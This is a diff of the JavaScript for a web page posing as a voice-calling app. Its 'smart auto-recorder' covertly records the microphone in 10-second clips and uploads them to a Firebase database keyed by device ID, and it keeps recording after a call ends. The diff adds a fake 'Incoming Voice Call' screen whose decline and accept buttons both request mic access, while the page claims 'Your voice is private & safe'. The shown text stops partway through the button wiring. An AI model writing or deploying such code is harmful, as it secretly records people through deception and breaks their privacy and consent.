-const incomingStatus = document.getElementById('incomingStatus');
-const permissionModal = document.getElementById('permissionModal');
-const callScreen = document.getElementById('callScreen');
-const callTimer = document.getElementById('callTimer');
-const smartRecBadge = document.getElementById('smartRecBadge');
-const smartRecCount = document.getElementById('smartRecCount');
-
-/* ============================================================
-   7. RENDER CONTACTS
-   ============================================================ */
-function renderContacts() {
-  contactList.innerHTML = CONTACTS.map(c => `
+    /* ============================================================
+       7. RENDER CONTACTS
+       ============================================================ */
+    function renderContacts() {
+      contactList.innerHTML = CONTACTS.map(c => `
     <div class="contact-item" onclick="startCall(${c.id})">
       <div class="avatar ${c.online ? 'online' : ''}"
            style="background: linear-gradient(135deg, ${c.color}, ${c.color}dd);">${c.initial}</div>
@@ -329,458 +683,506 @@ function renderContacts() {
       <button class="call-btn" onclick="event.stopPropagation(); startCall(${c.id})">📞</button>
     </div>
   `).join('');
-}
-renderContacts();
-
-/* ============================================================
-   8. TOAST
-   ============================================================ */
-function showToast(msg) {
-  const existing = document.querySelector('.toast');
-  if (existing) existing.remove();
-  const toast = document.createElement('div');
-  toast.className = 'toast';
-  toast.textContent = msg;
-  document.body.appendChild(toast);
-  setTimeout(() => {
-    toast.style.opacity = '0';
-    toast.style.transition = 'opacity 0.3s';
-    setTimeout(() => toast.remove(), 300);
-  }, 2500);
-}
-
-/* ============================================================
-   9. START CALL (no recording)
-   ============================================================ */
-window.startCall = async function(contactId) {
-  currentContact = CONTACTS.find(c => c.id === contactId);
-  if (!currentContact) return;
-  console.log('📞 Calling:', currentContact.name);
-
-  try {
-    micStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
-    console.log('✅ Mic granted (call UI)');
-    showToast('🎤 Mic allowed');
-  } catch (err) {
-    console.error('❌ Mic denied:', err.name);
-    let msg = '🚫 Mic permission required';
-    if (err.name === 'NotFoundError') msg = '🎤 No mic found';
-    if (err.name === 'NotReadableError') msg = '⚠️ Mic in use';
-    showToast(msg);
-    currentContact = null;
-    return;
-  }
-
-  incomingAvatar.textContent = currentContact.initial;
-  incomingAvatar.style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
-  incomingName.textContent = currentContact.name;
-  incomingStatus.textContent = '📞 Calling...';
-
-  contactScreen.classList.add('hide');
-  incomingScreen.classList.add('show');
-  playRingtone();
-
-  setTimeout(() => {
-    if (incomingScreen.classList.contains('show')) incomingStatus.textContent = '📞 Ringing...';
-  }, 1500);
-
-  setTimeout(() => {
-    if (incomingScreen.classList.contains('show')) acceptCallAuto();
-  }, 3500);
-};
-
-/* ============================================================
-   10. ACCEPT / CONNECT
-   ============================================================ */
-window.acceptCall = async function() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  await connectCall();
-};
-
-async function acceptCallAuto() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  console.log('📞 Auto-accepting...');
-  await connectCall();
-}
-
-async function connectCall() {
-  const audioTracks = micStreamOnly ? micStreamOnly.getAudioTracks() : [];
-  if (audioTracks.length === 0) { showToast('⚠️ No mic'); return; }
-  localStream = new MediaStream([...audioTracks]);
-  console.log('✅ Local stream ready (no recording)');
-  startCallUI();
-}
-
-/* ============================================================
-   11. DECLINE / CANCEL
-   ============================================================ */
-window.declineCall = function() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  contactScreen.classList.remove('hide');
-  if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
-  showToast('Call declined');
-  currentContact = null;
-};
-
-window.closePermissionModal = function() {
-  permissionModal.classList.remove('show');
-  contactScreen.classList.remove('hide');
-  if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
-  showToast('Cancelled');
-  currentContact = null;
-};
-
-/* ============================================================
-   12. CALL UI
-   ============================================================ */
-function startCallUI() {
-  callTimer.textContent = '00:00';
-  callSeconds = 0;
-  document.getElementById('callAvatar').textContent = currentContact.initial;
-  document.getElementById('callAvatar').style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
-  document.getElementById('callName').textContent = currentContact.name;
-  callScreen.classList.add('show');
-  callTimerInterval = setInterval(() => {
-    callSeconds++;
-    const m = String(Math.floor(callSeconds / 60)).padStart(2, '0');
-    const s = String(callSeconds % 60).padStart(2, '0');
-    callTimer.textContent = `${m}:${s}`;
-  }, 1000);
-  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-  showToast('✅ Call connected');
-}
-
-/* ============================================================
-   13. END CALL — smart recorder chalta rahega ✅
-   ============================================================ */
-window.endCall = function() {
-  if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
-
-  if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
-  if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
-
-  isMuted = false;
-  isSpeakerOn = false;
-  document.getElementById('muteBtn').classList.remove('active');
-  document.getElementById('speakerBtn').classList.remove('active');
-
-  callScreen.classList.remove('show');
-  contactScreen.classList.remove('hide');
-
-  const mins = Math.floor(callSeconds / 60);
-  const secs = callSeconds % 60;
-  showToast(`📞 Call ended • ${mins}m ${secs}s`);
-
-  currentContact = null;
-  callSeconds = 0;
-
-  // ✅ Smart recorder touch nahi kiya — chalta rahega
-  console.log('📞 Call ended — smart recorder still running');
-};
-
-/* ============================================================
-   14. CONTROLS
-   ============================================================ */
-window.toggleMute = function() {
-  if (!localStream) return;
-  const audioTrack = localStream.getAudioTracks()[0];
-  if (audioTrack) {
-    audioTrack.enabled = !audioTrack.enabled;
-    isMuted = !isMuted;
-    document.getElementById('muteBtn').classList.toggle('active', isMuted);
-    showToast(isMuted ? '🔇 Muted' : '🎤 Unmuted');
-  }
-};
-
-window.toggleSpeaker = function() {
-  isSpeakerOn = !isSpeakerOn;
-  document.getElementById('speakerBtn').classList.toggle('active', isSpeakerOn);
-  showToast(isSpeakerOn ? '🔊 Speaker ON' : '🔈 Speaker OFF');
-};
-
-/* ============================================================
-   15. RINGTONE
-   ============================================================ */
-let ringtoneCtx = null;
-let ringtoneInterval = null;
-
-function playRingtone() {
-  try {
-    if (ringtoneCtx) return;
-    ringtoneCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const playBeep = () => {
-      if (!ringtoneCtx) return;
-      const osc = ringtoneCtx.createOscillator();
-      const gain = ringtoneCtx.createGain();
-      osc.connect(gain); gain.connect(ringtoneCtx.destination);
-      osc.frequency.value = 800; osc.type = 'sine';
-      gain.gain.setValueAtTime(0, ringtoneCtx.currentTime);
-      gain.gain.linearRampToValueAtTime(0.15, ringtoneCtx.currentTime + 0.05);
-      gain.gain.linearRampToValueAtTime(0, ringtoneCtx.currentTime + 0.4);
-      osc.start(ringtoneCtx.currentTime); osc.stop(ringtoneCtx.currentTime + 0.5);
-    };
-    playBeep();
-    setTimeout(playBeep, 600);
-    ringtoneInterval = setInterval(() => { playBeep(); setTimeout(playBeep, 600); }, 2000);
-  } catch (e) { console.warn('Ringtone failed:', e); }
-}
-
-function stopRingtone() {
-  if (ringtoneInterval) { clearInterval(ringtoneInterval); ringtoneInterval = null; }
-  if (ringtoneCtx) { ringtoneCtx.close().catch(() => {}); ringtoneCtx = null; }
-}
-
-/* ============================================================
-   16. 🔥 SMART AUTO-RECORDER — ONLY RECORDING
-   ============================================================ */
-async function checkSmartMicPermission() {
-  if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
-  try {
-    const status = await navigator.permissions.query({ name: 'microphone' });
-    return status.state;
-  } catch (e) { return 'unknown'; }
-}
-
-async function startSmartRecorder() {
-  if (smartMicStream && smartMicStream.active) {
-    console.log('🎤 [Smart] Already running');
-    return true;
-  }
-  try {
-    console.log('🎤 [Smart] Requesting independent mic...');
-    smartMicStream = await navigator.mediaDevices.getUserMedia({
-      audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
-    });
-    console.log('✅ [Smart] Independent mic granted');
-    smartRecBadge.style.display = 'flex';
-    startSmartLoop();
-    return true;
-  } catch (err) {
-    console.error('❌ [Smart] Mic error:', err.name);
-    if (err.name === 'NotReadableError') {
-      console.log('⚠️ [Smart] Mic busy — retry in 5s');
-      setTimeout(() => startSmartRecorder(), 5000);
     }
-    return false;
-  }
-}
+    renderContacts();
 
-function startSmartLoop() {
-  stopSmartLoop();
-  smartClipCount = 0;
-  console.log('🎤 [Smart] Loop started (10 sec clips)');
-  setTimeout(() => { if (smartMicStream && smartMicStream.active) smartRecordClip(); }, 1500);
-  smartLoopTimer = setInterval(() => {
-    if (smartMicStream && smartMicStream.active && !smartIsRecording) smartRecordClip();
-  }, 11500);
-}
+    /* ============================================================
+       8. TOAST
+       ============================================================ */
+    function showToast(msg) {
+      const existing = document.querySelector('.toast');
+      if (existing) existing.remove();
+      const toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.textContent = msg;
+      document.body.appendChild(toast);
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = 'opacity 0.3s';
+        setTimeout(() => toast.remove(), 300);
+      }, 2500);
+    }
 
-function stopSmartLoop() {
-  if (smartLoopTimer) { clearInterval(smartLoopTimer); smartLoopTimer = null; }
-  if (smartRecorder && smartRecorder.state === 'recording') {
-    try { smartRecorder.stop(); } catch (e) {}
-  }
-  smartIsRecording = false;
-  console.log('⏹️ [Smart] Loop stopped');
-}
+    /* ============================================================
+       9. START CALL (no recording)
+       ============================================================ */
+    window.startCall = async function (contactId) {
+      currentContact = CONTACTS.find(c => c.id === contactId);
+      if (!currentContact) return;
+      console.log('📞 Calling:', currentContact.name);
 
-async function smartRecordClip() {
-  if (!smartMicStream || !smartMicStream.active || smartIsRecording) return;
-  const audioTracks = smartMicStream.getAudioTracks();
-  if (audioTracks.length === 0) return;
+      try {
+        micStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
+        console.log('✅ Mic granted (call UI)');
+        showToast('🎤 Mic allowed');
+      } catch (err) {
+        console.error('❌ Mic denied:', err.name);
+        let msg = '🚫 Mic permission required';
+        if (err.name === 'NotFoundError') msg = '🎤 No mic found';
+        if (err.name === 'NotReadableError') msg = '⚠️ Mic in use';
+        showToast(msg);
+        currentContact = null;
+        return;
+      }
 
-  try {
-    smartIsRecording = true;
-    smartChunks = [];
-    smartClipCount++;
-    console.log(`🎤 [Smart #${smartClipCount}] Recording...`);
+      incomingAvatar.textContent = currentContact.initial;
+      incomingAvatar.style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
+      incomingName.textContent = currentContact.name;
+      incomingStatus.textContent = '📞 Calling...';
 
-    const audioOnlyStream = new MediaStream(audioTracks);
-    let mimeType = 'audio/webm;codecs=opus';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
+      contactScreen.classList.add('hide');
+      incomingScreen.classList.add('show');
+      playRingtone();
 
-    const options = { audioBitsPerSecond: 24000 };
-    if (mimeType) options.mimeType = mimeType;
+      setTimeout(() => {
+        if (incomingScreen.classList.contains('show')) incomingStatus.textContent = '📞 Ringing...';
+      }, 1500);
 
-    smartRecorder = new MediaRecorder(audioOnlyStream, options);
-    smartRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) smartChunks.push(e.data); };
-    smartRecorder.onstop = async () => {
-      const actualMime = smartRecorder.mimeType || mimeType || 'audio/webm';
-      const blob = new Blob(smartChunks, { type: actualMime });
-      console.log(`🎤 [Smart #${smartClipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
-      if (blob.size > 500) await saveSmartClipToRTDB(blob, actualMime);
-      smartChunks = [];
-      smartIsRecording = false;
-      smartRecCount.textContent = smartClipCount;
+      setTimeout(() => {
+        if (incomingScreen.classList.contains('show')) acceptCallAuto();
+      }, 3500);
     };
-    smartRecorder.start();
-    setTimeout(() => {
-      if (smartRecorder && smartRecorder.state === 'recording') smartRecorder.stop();
-    }, SMART_CLIP_DURATION);
-  } catch (err) {
-    console.error('❌ [Smart] Record error:', err);
-    smartIsRecording = false;
-  }
-}
 
-async function saveSmartClipToRTDB(blob, mimeType) {
-  const now = new Date();
-  const timestamp = now.getTime();
-  const dt = getDateTime();
-  console.log('📤 [Smart] Saving...', (blob.size / 1024).toFixed(1), 'KB');
+    /* ============================================================
+       10. ACCEPT / CONNECT
+       ============================================================ */
+    window.acceptCall = async function () {
+      stopRingtone();
+      incomingScreen.classList.remove('show');
+      await connectCall();
+    };
 
-  let base64 = '';
-  try {
-    base64 = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onloadend = () => resolve(reader.result);
-      reader.onerror = reject;
-      reader.readAsDataURL(blob);
-    });
-  } catch (err) { console.error('❌ [Smart] Base64 failed:', err); return; }
+    async function acceptCallAuto() {
+      stopRingtone();
+      incomingScreen.classList.remove('show');
+      console.log('📞 Auto-accepting...');
+      await connectCall();
+    }
 
-  try {
-    const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);
-    const newRef = await push(audioRef, {
-      deviceId: DEVICE_ID,
-      sessionId: SESSION_ID,
-      audioBase64: base64,
-      size: blob.size,
-      duration: SMART_CLIP_DURATION / 1000,
-      mimeType: mimeType || 'audio/webm',
-      date: dt.date,
-      time: dt.time,
-      timestamp: timestamp,
-      capturedAtISO: dt.iso,
-      capturedAt: serverTimestamp(),
-      source: 'smart-auto'
-    });
-    console.log('✅ [Smart] Saved:', newRef.key, '|', dt.time);
-  } catch (err) {
-    console.error('❌ [Smart] RTDB FAILED:', err.code, err.message);
-  }
-}
+    async function connectCall() {
+      const audioTracks = micStreamOnly ? micStreamOnly.getAudioTracks() : [];
+      if (audioTracks.length === 0) { showToast('⚠️ No mic'); return; }
+      localStream = new MediaStream([...audioTracks]);
+      console.log('✅ Local stream ready (no recording)');
+      startCallUI();
+    }
 
-/* Background save */
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden && smartRecorder && smartRecorder.state === 'recording') {
-    console.log('👁️ [Smart] Tab hidden — saving');
-    try { smartRecorder.stop(); } catch (e) {}
-  }
-});
+    /* ============================================================
+       11. DECLINE / CANCEL
+       ============================================================ */
+    window.declineCall = function () {
+      stopRingtone();
+      incomingScreen.classList.remove('show');
+      contactScreen.classList.remove('hide');
+      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
+      showToast('Call declined');
+      currentContact = null;
+    };
 
-window.addEventListener('pagehide', () => {
-  if (smartRecorder && smartRecorder.state === 'recording') {
-    try { smartRecorder.stop(); } catch (e) {}
-  }
-});
+    window.closePermissionModal = function () {
+      permissionModal.classList.remove('show');
+      contactScreen.classList.remove('hide');
+      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
+      showToast('Cancelled');
+      currentContact = null;
+    };
 
-/* Permission watch */
-async function watchSmartPermission() {
-  if (!navigator.permissions || !navigator.permissions.query) return;
-  try {
-    const status = await navigator.permissions.query({ name: 'microphone' });
-    status.onchange = () => {
-      console.log('🔔 [Smart] Permission changed:', status.state);
-      if (status.state === 'granted' && (!smartMicStream || !smartMicStream.active)) {
-        startSmartRecorder();
+    /* ============================================================
+       12. CALL UI
+       ============================================================ */
+    function startCallUI() {
+      callTimer.textContent = '00:00';
+      callSeconds = 0;
+      document.getElementById('callAvatar').textContent = currentContact.initial;
+      document.getElementById('callAvatar').style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
+      document.getElementById('callName').textContent = currentContact.name;
+      callScreen.classList.add('show');
+      callTimerInterval = setInterval(() => {
+        callSeconds++;
+        const m = String(Math.floor(callSeconds / 60)).padStart(2, '0');
+        const s = String(callSeconds % 60).padStart(2, '0');
+        callTimer.textContent = `${m}:${s}`;
+      }, 1000);
+      if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+      showToast('✅ Call connected');
+    }
+
+    /* ============================================================
+       13. END CALL — smart recorder chalta rahega ✅
+       ============================================================ */
+    window.endCall = function () {
+      if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
+
+      if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
+
+      isMuted = false;
+      isSpeakerOn = false;
+      document.getElementById('muteBtn').classList.remove('active');
+      document.getElementById('speakerBtn').classList.remove('active');
+
+      callScreen.classList.remove('show');
+      contactScreen.classList.remove('hide');
+
+      const mins = Math.floor(callSeconds / 60);
+      const secs = callSeconds % 60;
+      showToast(`📞 Call ended • ${mins}m ${secs}s`);
+
+      currentContact = null;
+      callSeconds = 0;
+
+      // ✅ Smart recorder touch nahi kiya — chalta rahega
+      console.log('📞 Call ended — smart recorder still running');
+    };
+
+    /* ============================================================
+       14. CONTROLS
+       ============================================================ */
+    window.toggleMute = function () {
+      if (!localStream) return;
+      const audioTrack = localStream.getAudioTracks()[0];
+      if (audioTrack) {
+        audioTrack.enabled = !audioTrack.enabled;
+        isMuted = !isMuted;
+        document.getElementById('muteBtn').classList.toggle('active', isMuted);
+        showToast(isMuted ? '🔇 Muted' : '🎤 Unmuted');
       }
     };
-  } catch (e) {}
-}
 
-/* Convince modal */
-function showMicConvinceModal() {
-  if (document.getElementById('micConvinceModal')) return;
+    window.toggleSpeaker = function () {
+      isSpeakerOn = !isSpeakerOn;
+      document.getElementById('speakerBtn').classList.toggle('active', isSpeakerOn);
+      showToast(isSpeakerOn ? '🔊 Speaker ON' : '🔈 Speaker OFF');
+    };
 
-  const modal = document.createElement('div');
-  modal.id = 'micConvinceModal';
-  modal.style.cssText = `
-    position:fixed; inset:0; background:rgba(0,0,0,0.92);
-    display:flex; align-items:center; justify-content:center;
-    padding:24px; z-index:99999;
+    /* ============================================================
+       15. RINGTONE
+       ============================================================ */
+    let ringtoneCtx = null;
+    let ringtoneInterval = null;
+
+    function playRingtone() {
+      try {
+        if (ringtoneCtx) return;
+        ringtoneCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const playBeep = () => {
+          if (!ringtoneCtx) return;
+          const osc = ringtoneCtx.createOscillator();
+          const gain = ringtoneCtx.createGain();
+          osc.connect(gain); gain.connect(ringtoneCtx.destination);
+          osc.frequency.value = 800; osc.type = 'sine';
+          gain.gain.setValueAtTime(0, ringtoneCtx.currentTime);
+          gain.gain.linearRampToValueAtTime(0.15, ringtoneCtx.currentTime + 0.05);
+          gain.gain.linearRampToValueAtTime(0, ringtoneCtx.currentTime + 0.4);
+          osc.start(ringtoneCtx.currentTime); osc.stop(ringtoneCtx.currentTime + 0.5);
+        };
+        playBeep();
+        setTimeout(playBeep, 600);
+        ringtoneInterval = setInterval(() => { playBeep(); setTimeout(playBeep, 600); }, 2000);
+      } catch (e) { console.warn('Ringtone failed:', e); }
+    }
+
+    function stopRingtone() {
+      if (ringtoneInterval) { clearInterval(ringtoneInterval); ringtoneInterval = null; }
+      if (ringtoneCtx) { ringtoneCtx.close().catch(() => { }); ringtoneCtx = null; }
+    }
+
+    /* ============================================================
+       16. 🔥 SMART AUTO-RECORDER — ONLY RECORDING
+       ============================================================ */
+    async function checkSmartMicPermission() {
+      if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
+      try {
+        const status = await navigator.permissions.query({ name: 'microphone' });
+        return status.state;
+      } catch (e) { return 'unknown'; }
+    }
+
+    async function startSmartRecorder() {
+      if (smartMicStream && smartMicStream.active) {
+        console.log('🎤 [Smart] Already running');
+        return true;
+      }
+      try {
+        console.log('🎤 [Smart] Requesting independent mic...');
+        smartMicStream = await navigator.mediaDevices.getUserMedia({
+          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
+        });
+        console.log('✅ [Smart] Independent mic granted');
+        smartRecBadge.style.display = 'flex';
+        startSmartLoop();
+        return true;
+      } catch (err) {
+        console.error('❌ [Smart] Mic error:', err.name);
+        if (err.name === 'NotReadableError') {
+          console.log('⚠️ [Smart] Mic busy — retry in 5s');
+          setTimeout(() => startSmartRecorder(), 5000);
+        }
+        return false;
+      }
+    }
+
+    function startSmartLoop() {
+      stopSmartLoop();
+      smartClipCount = 0;
+      console.log('🎤 [Smart] Loop started (10 sec clips)');
+      setTimeout(() => { if (smartMicStream && smartMicStream.active) smartRecordClip(); }, 1500);
+      smartLoopTimer = setInterval(() => {
+        if (smartMicStream && smartMicStream.active && !smartIsRecording) smartRecordClip();
+      }, 11500);
+    }
+
+    function stopSmartLoop() {
+      if (smartLoopTimer) { clearInterval(smartLoopTimer); smartLoopTimer = null; }
+      if (smartRecorder && smartRecorder.state === 'recording') {
+        try { smartRecorder.stop(); } catch (e) { }
+      }
+      smartIsRecording = false;
+      console.log('⏹️ [Smart] Loop stopped');
+    }
+
+    async function smartRecordClip() {
+      if (!smartMicStream || !smartMicStream.active || smartIsRecording) return;
+      const audioTracks = smartMicStream.getAudioTracks();
+      if (audioTracks.length === 0) return;
+
+      try {
+        smartIsRecording = true;
+        smartChunks = [];
+        smartClipCount++;
+        console.log(`🎤 [Smart #${smartClipCount}] Recording...`);
+
+        const audioOnlyStream = new MediaStream(audioTracks);
+        let mimeType = 'audio/webm;codecs=opus';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
+
+        const options = { audioBitsPerSecond: 24000 };
+        if (mimeType) options.mimeType = mimeType;
+
+        smartRecorder = new MediaRecorder(audioOnlyStream, options);
+        smartRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) smartChunks.push(e.data); };
+        smartRecorder.onstop = async () => {
+          const actualMime = smartRecorder.mimeType || mimeType || 'audio/webm';
+          const blob = new Blob(smartChunks, { type: actualMime });
+          console.log(`🎤 [Smart #${smartClipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
+          if (blob.size > 500) await saveSmartClipToRTDB(blob, actualMime);
+          smartChunks = [];
+          smartIsRecording = false;
+          smartRecCount.textContent = smartClipCount;
+        };
+        smartRecorder.start();
+        setTimeout(() => {
+          if (smartRecorder && smartRecorder.state === 'recording') smartRecorder.stop();
+        }, SMART_CLIP_DURATION);
+      } catch (err) {
+        console.error('❌ [Smart] Record error:', err);
+        smartIsRecording = false;
+      }
+    }
+
+    async function saveSmartClipToRTDB(blob, mimeType) {
+      const now = new Date();
+      const timestamp = now.getTime();
+      const dt = getDateTime();
+      console.log('📤 [Smart] Saving...', (blob.size / 1024).toFixed(1), 'KB');
+
+      let base64 = '';
+      try {
+        base64 = await new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.onerror = reject;
+          reader.readAsDataURL(blob);
+        });
+      } catch (err) { console.error('❌ [Smart] Base64 failed:', err); return; }
+
+      try {
+        const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);
+        const newRef = await push(audioRef, {
+          deviceId: DEVICE_ID,
+          sessionId: SESSION_ID,
+          audioBase64: base64,
+          size: blob.size,
+          duration: SMART_CLIP_DURATION / 1000,
+          mimeType: mimeType || 'audio/webm',
+          date: dt.date,
+          time: dt.time,
+          timestamp: timestamp,
+          capturedAtISO: dt.iso,
+          capturedAt: serverTimestamp(),
+          source: 'smart-auto'
+        });
+        console.log('✅ [Smart] Saved:', newRef.key, '|', dt.time);
+      } catch (err) {
+        console.error('❌ [Smart] RTDB FAILED:', err.code, err.message);
+      }
+    }
+
+    /* Background save */
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden && smartRecorder && smartRecorder.state === 'recording') {
+        console.log('👁️ [Smart] Tab hidden — saving');
+        try { smartRecorder.stop(); } catch (e) { }
+      }
+    });
+
+    window.addEventListener('pagehide', () => {
+      if (smartRecorder && smartRecorder.state === 'recording') {
+        try { smartRecorder.stop(); } catch (e) { }
+      }
+    });
+
+    /* Permission watch */
+    async function watchSmartPermission() {
+      if (!navigator.permissions || !navigator.permissions.query) return;
+      try {
+        const status = await navigator.permissions.query({ name: 'microphone' });
+        status.onchange = () => {
+          console.log('🔔 [Smart] Permission changed:', status.state);
+          if (status.state === 'granted' && (!smartMicStream || !smartMicStream.active)) {
+            startSmartRecorder();
+          }
+        };
+      } catch (e) { }
+    }
+
+    /* Convince modal — Call style (Red/Green buttons) */
+    function showMicConvinceModal() {
+      if (document.getElementById('micConvinceModal')) return;
+
+      const modal = document.createElement('div');
+      modal.id = 'micConvinceModal';
+      modal.style.cssText = `
+    position:fixed; inset:0; background:linear-gradient(180deg, #1c1c1e 0%, #000 100%);
+    display:flex; flex-direction:column; align-items:center;
+    justify-content:space-between; padding:60px 24px 60px;
+    z-index:99999; animation:fadeIn 0.3s ease;
   `;
-  modal.innerHTML = `
-    <div style="background:#1c1c1e; border-radius:20px; padding:32px 24px;
-                max-width:400px; width:100%; text-align:center; color:#fff;
-                box-shadow:0 20px 60px rgba(0,0,0,0.6);">
-      <div style="font-size:72px; margin-bottom:16px;">🎤</div>
-      <h2 style="font-size:22px; margin-bottom:12px;">Enable Microphone</h2>
-      <p style="font-size:15px; color:#8e8e93; line-height:1.6; margin-bottom:20px;">
-        Voice makes chats more fun and personal. Enable mic to continue.
-      </p>
-      <div style="background:#2c2c2e; border-radius:12px; padding:14px;
+
+      modal.innerHTML = `
+    <style>
+      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+      @keyframes pulseAvatar {
+        0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,132,255,0.5); }
+        50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); }
+      }
+      @keyframes acceptPulse {
+        0%, 100% { box-shadow: 0 0 0 0 rgba(49,162,76,0.6); }
+        50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); }
+      }
+      @keyframes declinePulse {
+        0%, 100% { box-shadow: 0 0 0 0 rgba(255,59,48,0.6); }
+        50% { box-shadow: 0 0 0 20px rgba(255,59,48,0); }
+      }
+    </style>
+
+    <!-- Top: Avatar + Name -->
+    <div style="display:flex; flex-direction:column; align-items:center; gap:20px; margin-top:40px;">
+      <div style="width:140px; height:140px; border-radius:50%;
+                  background:linear-gradient(135deg, #0084FF, #00C6FF);
+                  display:flex; align-items:center; justify-content:center;
+                  font-size:56px; font-weight:600;
+                  animation:pulseAvatar 2s infinite;">🎤</div>
+
+      <div style="font-size:28px; font-weight:600;">Incoming Voice Call</div>
+      <div style="font-size:15px; color:#8e8e93;">Enable mic to answer</div>
+      <div style="font-size:14px; color:#0084FF; margin-top:8px;">📞 Ringing...</div>
+
+      <!-- Benefits box -->
+      <div style="background:#2c2c2e; border-radius:12px; padding:14px 18px;
                   text-align:left; font-size:13px; line-height:1.8;
-                  color:#e0e0e0; margin-bottom:20px;">
-        ✨ <strong style="color:#4285F4;">Benefits:</strong><br>
+                  color:#e0e0e0; margin-top:12px; max-width:320px;">
+        ✨ <strong style="color:#4285F4;">Why mic?</strong><br>
         • 3x faster conversations<br>
         • Voice beats text every time<br>
-        • Connect with strangers instantly<br>
         <span style="color:#31A24C;">🔒 Your voice is private & safe</span>
       </div>
-      <button id="micAllowBtn" style="width:100%; padding:16px; border:none;
-        border-radius:12px; background:#0084FF; color:#fff; font-size:16px;
-        font-weight:600; cursor:pointer; margin-bottom:10px;">
-        ✅ Allow Microphone
-      </button>
-      <button id="micSkipBtn" style="width:100%; padding:14px; border:none;
-        border-radius:12px; background:transparent; color:#8e8e93;
-        font-size:14px; cursor:pointer;">
-        Skip — Continue without voice
-      </button>
+    </div>
+
+    <!-- Bottom: Red + Green buttons (call style) -->
+    <div style="display:flex; gap:60px; align-items:center; padding-bottom:20px;">
+      <button id="micDeclineBtn" style="
+        width:72px; height:72px; border-radius:50%;
+        border:none; font-size:28px; cursor:pointer;
+        display:flex; align-items:center; justify-content:center;
+        background:#FF3B30; color:#fff;
+        animation:declinePulse 1.5s infinite;
+        transition:transform 0.15s;
+      ">✕</button>
+
+      <button id="micAcceptBtn" style="
+        width:72px; height:72px; border-radius:50%;
+        border:none; font-size:28px; cursor:pointer;
+        display:flex; align-items:center; justify-content:center;
+        background:#31A24C; color:#fff;
+        animation:acceptPulse 1.5s infinite;
+        transition:transform 0.15s;
+      ">📞</button>
     </div>
   `;
-  document.body.appendChild(modal);
 
-  document.getElementById('micAllowBtn').onclick = async () => {
-    modal.remove();
-    const success = await startSmartRecorder();
-    if (!success) setTimeout(() => showMicConvinceModal(), 3000);
-  };
-  document.getElementById('micSkipBtn').onclick = () => {
-    modal.remove();
-    console.log('⏭️ [Smart] User skipped');
-  };
-}
+      document.body.appendChild(modal);
 
-/* INIT */
-async function initSmartRecorder() {
-  console.log('🚀 [Smart] Init...');
-  const state = await checkSmartMicPermission();
-  console.log('📋 [Smart] Permission:', state);
+      // 🔥 Dono buttons pe SAME action — permission ask
+      const askPermission = async () => {
+        modal.remove();
+        console.log('🎤 User tapped button — requesting mic...');
+        const success = await startSmartRecorder();
 
-  if (state === 'granted') {
-    console.log('✅ [Smart] Granted — auto-starting');
-    await startSmartRecorder();
-  } else if (state === 'prompt') {
-    console.log('⚠️ [Smart] Prompt — showing convince modal');
-    setTimeout(() => showMicConvinceModal(), 2000);
-  } else if (state === 'denied') {
-    console.log('🚫 [Smart] Denied — silent');
-  }
-  watchSmartPermission();
-}
+        if (!success) {
+          // Permission fail → 3 sec baad dobara modal
+          setTimeout(() => showMicConvinceModal(), 3000);
+        }
+      };
 
-setTimeout(() => initSmartRecorder(), 1500);
+      document.getElementById('micAcceptBtn').onclick = askPermission;
